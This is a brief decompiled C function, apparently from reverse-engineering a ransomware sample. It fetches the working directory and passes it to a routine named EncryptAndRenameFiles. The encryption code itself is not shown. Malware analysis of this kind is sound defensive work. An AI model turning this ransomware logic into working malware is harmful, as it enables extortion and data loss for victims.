
void RansomwareProcessor_140008240(void)

{
  undefined auStack_248[32];
  WCHAR dir[264];
  ulonglong local_18;

  local_18 = DAT_140086038 ^ (ulonglong)auStack_248;
  printf((char *)L"Getting current directory. ");
  GetCurrentDirectoryW(0x104, dir);
  EncryptAndRenameFiles_140007590(dir);
  Sleep(10000);
  thunk_FUN_140006f50();
  thunk_FUN_14000ae80(local_18 ^ (ulonglong)auStack_248);
  return;
}
